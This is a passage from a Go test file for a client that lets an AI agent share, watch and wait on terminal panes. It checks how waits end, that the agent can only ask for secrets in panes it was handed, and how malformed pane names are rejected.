		w.say("$ serve\nlistening on 8080")
	}()

	look, waited, err := c.Wait(pane.ID, 500, Until{Contains: "listening on", TimeoutMS: 2000})
	if err != nil {
		t.Fatalf("the wait failed rather than waiting: %v", err)
	}
	if waited.GaveUp {
		t.Error("it says the time ran out, and it did not")
	}
	if !strings.Contains(look.Screen, "listening on") {
		t.Errorf("it answered with %q", look.Screen)
	}
	if !strings.Contains(look.Note, "could not be read") {
		t.Errorf("it said nothing about the read that failed: %q", look.Note)
	}
}

// addedSince is the lines a later reading has that an earlier one did
// not, however far the pane scrolled in between.
func TestTheLinesAddedSinceAReadingAreTheNewOnes(t *testing.T) {
	for _, tc := range []struct {
		what, was, now, want string
	}{
		{"nothing said", "a\nb\nc", "a\nb\nc", ""},
		{"two lines more", "a\nb\nc", "a\nb\nc\nd\ne", "d\ne"},
		{"the top scrolled off", "a\nb\nc", "b\nc\nd", "d"},
		{"all of it scrolled off", "a\nb\nc", "x\ny\nz", "x\ny\nz"},
		{"the bottom row redrawn", "a\nb\n$ ", "a\nb\n$ ls\nx", "$ ls\nx"},
		// Nothing was read before, so nothing carried over and all of it
		// is new, down to a first line that is empty.
		{"no earlier reading", "", "\nBuild succeeded", "\nBuild succeeded"},
		{"no earlier reading of anything", "", "", ""},
		// The bound the doc states: the same command run twice matches a
		// longer run than really carried over, so the second run is taken
		// for the first.
		{"a block repeated exactly", "$ make\nok\n$ make\nok", "$ make\nok\n$ make\nok", ""},
		{"the screen cleared", "a\nb\nc", "\n\n$ ", "\n\n$ "},
		{"a full-screen program took over", "$ vim x\n", "  1 package main\n  2\n~",
			"  1 package main\n  2\n~"},
	} {
		if got := addedSince(tc.was, tc.now); got != tc.want {
			t.Errorf("%s: %q, want %q", tc.what, got, tc.want)
		}
	}
}

// dialled is an agent connected to a window, hung up on when the test
// ends.
func dialled(t *testing.T, code string) *Client {
	t.Helper()
	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	t.Cleanup(func() { _ = c.Close() })
	return c
}

// opened is the first pane of the share a code names, for a test about
// one pane.
func opened(t *testing.T, c *Client, code string) Pane {
	t.Helper()
	sh, err := c.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}
	if len(sh.Panes) == 0 {
		t.Fatalf("the share has no panes in it: %+v", sh)
	}
	return sh.Panes[0]
}

// finish is the program in the pane ending.
func (w *fakeWindow) finish() {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.gone = true
	w.changed++
}

// A wait ends when the shell says the command finished, and says that is
// why it ended.
//
// The count of finished commands is what it watches: it only moves
// forward, so a finish while the wait is on is one this wait saw.
func TestAWaitEndsWhenTheShellSaysTheCommandFinished(t *testing.T) {
	w, _, code := listening(t)
	w.marking()
	w.say("$ make")
	c := dialled(t, code)
	pane := opened(t, c, code)

	go func() {
		time.Sleep(30 * time.Millisecond)
		w.say("$ make\nbuilt\n$ ")
		w.finished(2)
	}()

	// A long quiet, so a wait that ended because the pane went quiet
	// rather than because the command finished fails here.
	look, ended, err := c.Wait(pane.ID, 0, Until{QuietMS: 30000, TimeoutMS: 10000})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if ended.GaveUp || ended.Because != EndedOnMarks {
		t.Errorf("the wait ended %+v, want %q", ended, EndedOnMarks)
	}
	if !look.Marks || look.Running {
		t.Errorf("the look says marks %v, running %v", look.Marks, look.Running)
	}
	if !look.HasStatus || look.Status != 2 {
		t.Errorf("the look says exit %d, known %v; want 2", look.Status, look.HasStatus)
	}
}

// A command that finished before the agent typed here does not end a
// wait: its status is somebody else's.
func TestAWaitIgnoresACommandThatWasNotTheAgents(t *testing.T) {
	w, _, code := listening(t)
	w.ranBefore(0)
	w.say("$ ")
	c := dialled(t, code)
	pane := opened(t, c, code)

	_, ended, err := c.Wait(pane.ID, 0, Until{QuietMS: 40, TimeoutMS: 10000})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if ended.Because != EndedOnQuiet {
		t.Errorf("the wait ended %+v, want %q", ended, EndedOnQuiet)
	}
}

// A shell that marks nothing is watched for the prompt coming back,
// which is what a command finishing looks like from outside.
func TestAWaitEndsWhenThePromptComesBack(t *testing.T) {
	w, _, code := listening(t)
	w.say("$ sleep 1")
	w.typedAt()
	c := dialled(t, code)
	pane := opened(t, c, code)

	go func() {
		time.Sleep(30 * time.Millisecond)
		w.say("$ sleep 1\n$ ")
		w.promptBack(true)
	}()

	look, ended, err := c.Wait(pane.ID, 0, Until{QuietMS: 30000, TimeoutMS: 10000})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if ended.GaveUp || ended.Because != EndedOnPrompt {
		t.Errorf("the wait ended %+v, want %q", ended, EndedOnPrompt)
	}
	if look.Marks {
		t.Error("the look says the shell marks its commands")
	}
}

// A pane nobody has typed in has no prompt to watch for, so a wait on it
// ends the way it always did.
func TestAWaitOnAPaneTheAgentHasNotTypedInEndsOnTheQuiet(t *testing.T) {
	w, _, code := listening(t)
	w.say("$ ")
	c := dialled(t, code)
	pane := opened(t, c, code)

	_, ended, err := c.Wait(pane.ID, 0, Until{QuietMS: 40, TimeoutMS: 10000})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if ended.Because != EndedOnQuiet {
		t.Errorf("the wait ended %+v, want %q", ended, EndedOnQuiet)
	}
}

// A prompt is not taken for the prompt until the pane has been quiet for
// a moment.
//
// Mid-output the cursor sits wherever the last chunk of bytes left it,
// and a line that happens to read like the prompt is not the prompt. A
// wait that ended on one would hand the agent half of what it asked for
// and call it finished.
func TestAWaitDoesNotTakeAPromptSeenMidOutputForTheRealOne(t *testing.T) {
	w, _, code := listening(t)
	w.say("$ cat notes")
	w.typedAt()
	c := dialled(t, code)
	pane := opened(t, c, code)

	// Output that keeps arriving, looking like the prompt each time it
	// is read, and then a real prompt at the end of it.
	done := make(chan struct{})
	go func() {
		defer close(done)
		for i := 0; i < 8; i++ {
			w.promptBack(true)
			time.Sleep(20 * time.Millisecond)
		}
	}()

	_, ended, err := c.Wait(pane.ID, 0, Until{QuietMS: 30000, TimeoutMS: 3000})
	<-done
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	// It ends once the output stops, and not before: the prompt was on
	// screen from the first look.
	if ended.GaveUp || ended.Because != EndedOnPrompt {
		t.Errorf("the wait ended %+v, want %q once the pane settled", ended, EndedOnPrompt)
	}
}

// Every other way a wait can end says which one it was, so an agent can
// tell a command that finished from a screen that merely stopped moving.
func TestAWaitSaysHowElseItEnded(t *testing.T) {
	t.Run("the text", func(t *testing.T) {
		w, _, code := listening(t)
		w.say("Build succeeded")
		c := dialled(t, code)
		pane := opened(t, c, code)

		_, ended, err := c.Wait(pane.ID, 0, Until{Contains: "succeeded", TimeoutMS: 2000})
		if err != nil {
			t.Fatalf("wait: %v", err)
		}
		if ended.GaveUp || ended.Because != EndedOnText {
			t.Errorf("the wait ended %+v, want %q", ended, EndedOnText)
		}
	})

	t.Run("the time", func(t *testing.T) {
		w, _, code := listening(t)
		w.say("still going")
		c := dialled(t, code)
		pane := opened(t, c, code)

		_, ended, err := c.Wait(pane.ID, 0, Until{Contains: "never", TimeoutMS: 150})
		if err != nil {
			t.Fatalf("wait: %v", err)
		}
		if !ended.GaveUp || ended.Because != EndedOnTime {
			t.Errorf("the wait ended %+v, want the time running out", ended)
		}
	})

	t.Run("the program", func(t *testing.T) {
		w, _, code := listening(t)
		w.say("$ exit")
		c := dialled(t, code)
		pane := opened(t, c, code)
		w.finish()

		_, ended, err := c.Wait(pane.ID, 0, Until{Contains: "never", TimeoutMS: 2000})
		if err != nil {
			t.Fatalf("wait: %v", err)
		}
		if ended.GaveUp || ended.Because != EndedOnGone {
			t.Errorf("the wait ended %+v, want %q", ended, EndedOnGone)
		}
	})
}

// A command that finishes ends a wait that was watching for text, and
// says that is why.
//
// The text was going to be printed by the command, so a command that
// has finished without printing it is not going to. An agent left until
// the time ran out would pay the whole timeout for every failed build.
func TestACommandFinishingEndsAWaitForText(t *testing.T) {
	w, _, code := listening(t)
	w.marking()
	w.say("$ make")
	c := dialled(t, code)
	pane := opened(t, c, code)

	go func() {
		time.Sleep(30 * time.Millisecond)
		w.say("$ make\nBuild failed\n$ ")
		w.finished(1)
	}()

	_, ended, err := c.Wait(pane.ID, 0, Until{Contains: "Build succeeded", TimeoutMS: 10000})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if ended.GaveUp || ended.Because != EndedOnMarks {
		t.Errorf("the wait ended %+v, want %q", ended, EndedOnMarks)
	}
}

// A pane that goes quiet while the shell says a command is running does
// not end the wait.
//
// A command that thinks before it prints -- sleep, apt update, ssh
// before the banner -- is silent from the moment it starts. Ending there
// would hand the agent a screen from the middle of the command and call
// it finished, which is the whole thing this is meant to stop.
func TestAWaitDoesNotGiveUpOnACommandTheShellSaysIsRunning(t *testing.T) {
	w, _, code := listening(t)
	w.marking()
	w.say("$ sleep 5")
	c := dialled(t, code)
	pane := opened(t, c, code)

	go func() {
		// Well past the quiet, and silent throughout.
		time.Sleep(200 * time.Millisecond)
		w.say("$ sleep 5\n$ ")
		w.finished(0)
	}()

	_, ended, err := c.Wait(pane.ID, 0, Until{QuietMS: 40, TimeoutMS: 10000})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if ended.Because != EndedOnMarks {
		t.Errorf("the wait ended %+v, want it to have waited for the command", ended)
	}
}

// A mark left stuck saying a command is running does not cost the whole
// timeout. The wait ends far later than an ordinary quiet, and says
// exactly what it saw.
func TestAWaitGivesUpOnAMarkLeftStuckRunning(t *testing.T) {
	w, _, code := listening(t)
	w.marking()
	w.say("$ ")
	c := dialled(t, code)
	pane := opened(t, c, code)

	// Ten times the quiet is 300ms, which is well inside the timeout.
	_, ended, err := c.Wait(pane.ID, 0, Until{QuietMS: 30, TimeoutMS: 10000})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if ended.GaveUp || ended.Because != EndedOnStuck {
		t.Errorf("the wait ended %+v, want %q", ended, EndedOnStuck)
	}
}

// Asking for a secret reaches only a pane this agent has been handed,
// like everything else.
func TestAskingForASecretNeedsTheCodeFirst(t *testing.T) {
	w, _, code := listening(t)
	c := dialled(t, code)

	// No code used yet, so this agent holds nothing.
	if _, err := c.Secret("1.1", "a passphrase", time.Second); err == nil {
		t.Fatal("it asked on a pane it had not been handed")
	}
	if got := w.secretAskedFor(); got != "" {
		t.Errorf("the window was asked for %q", got)
	}

	// And with the code, it reaches the pane it was given.
	pane := opened(t, c, code)
	w.typesSecretNow()
	typed, err := c.Secret(pane.ID, "a passphrase", 2*time.Second)
	if err != nil {
		t.Fatalf("asking: %v", err)
	}
	if !typed {
		t.Error("it was told the user typed nothing")
	}
	if got := w.secretAskedFor(); got != "a passphrase" {
		t.Errorf("the window was asked for %q", got)
	}
}

// secretAskedFor is what the last ask asked the user for.
func (w *fakeWindow) secretAskedFor() string {
	w.mu.Lock()
	defer w.mu.Unlock()
	return w.askedFor
}

// typesSecretNow is a user who answers the next ask at once.
func (w *fakeWindow) typesSecretNow() {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.typesSecret = make(chan struct{})
	close(w.typesSecret)
}

// A name that is nearly a pane name is not one.
//
// holds is half of what keeps an agent out of a share it has no code
// for, and the window's own check is the other half. This one has to
// stand on its own.
func TestANameThatIsNearlyAPaneNameNamesNothing(t *testing.T) {
	for _, name := range []string{
		"", ".", "1", "1.", ".1", "1.1.1", "01.2", "1.01", " 1.1", "1.1 ",
		"1..1", "-1.1", "1.-1", "99999999999999999999.1", "one.two", "1.1x",
	} {
		if share, ok := ShareOf(name); ok {
			t.Errorf("%q names share %d, want it refused", name, share)
		}
		if holds(map[uint64]bool{1: true, 0: true}, name) {
			t.Errorf("an agent holding share 1 is given %q", name)
		}
	}
	// And the names the window does make.
	for _, name := range []string{"1.2", "3.7", "10.11"} {
		if _, ok := ShareOf(name); !ok {
			t.Errorf("%q is a name this window makes, and was refused", name)
		}
	}
}

// A window that cannot be asked what is in a share says so, rather than
// the agent being told it has nothing.
//
// The two are different answers. A share that has ended is skipped,
// because the agent asked what it has and it has the rest. Anything else
// is the window failing, and an agent told "you have no panes" goes back
// to the user for a code it does not need.
func TestAWindowThatCannotBeAskedIsNotAnEmptyShare(t *testing.T) {
	w, _, code := listening(t)
	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	opened(t, c, code)

	w.mu.Lock()
	w.cannotAsk = errors.New("this window is closing")
	w.mu.Unlock()

	panes, err := c.Panes()
	if err == nil {
		t.Fatalf("the agent was told it has %+v, want the failure", panes)
	}
	if !strings.Contains(err.Error(), "this window is closing") {
		t.Errorf("it said %v, want what the window said", err)
	}

	// A share that has ended is still skipped.
	w.mu.Lock()
	w.cannotAsk = nil
	w.taken = true
	w.mu.Unlock()
	panes, err = c.Panes()
	if err != nil {
		t.Fatalf("asking what it has after the share ended: %v", err)
	}
	if len(panes) != 0 {
		t.Errorf("the agent was told it has %+v, want nothing", panes)
	}
}
